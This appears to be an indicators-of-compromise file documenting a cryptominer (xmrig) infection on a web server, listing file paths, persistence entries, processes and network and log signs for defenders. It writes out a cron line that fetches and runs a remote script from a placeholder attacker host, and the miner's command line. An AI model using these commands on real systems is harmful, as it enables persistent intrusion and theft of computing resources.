
---

# 📄 `ioc.md`

```markdown
# Indicators of Compromise (IOC)

## File Paths
```text
/var/www/APP_NAME/frontend/xmrig-6.25.0/xmrig
/usr/bin/.syslogd
/tmp/.cache/.kworker
/etc/systemd/system/xmrig.service

Cron Jobs
@reboot curl -fsSL http://<attacker-ip>/payload.sh | bash

systemd Services
[Service]
ExecStart=/var/www/app/frontend/.next-cache
Restart=always

Malicious Processes
xmrig -o pool.supportxmr.com -u <wallet>

Network Indicators

Outbound connections to:

pool.supportxmr.com

Sustained high CPU usage

Unexpected outbound traffic from web server

Log Indicators

sudo executions from web application directories

chmod operations on unknown binaries

chkrootkit service failures


---
